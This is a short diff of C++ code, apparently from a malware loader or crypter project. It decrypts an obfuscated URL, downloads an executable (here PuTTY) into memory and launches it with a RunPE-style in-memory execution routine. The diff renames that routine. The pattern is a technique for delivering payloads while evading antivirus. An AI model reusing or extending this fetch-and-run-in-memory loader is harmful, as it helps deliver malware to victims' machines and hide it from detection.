@@ -24,6 +24,6 @@ int main()
 {
 	std::string hiddenUrl = OBFUSCATE("http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");
 	LPVOID FileData = DownloadURLToBuffer(hiddenUrl.c_str());
-	RunPortableExecutable(FileData);
+	NTRX_RUNPE32(FileData);
 	ExitProcess(0);
 }
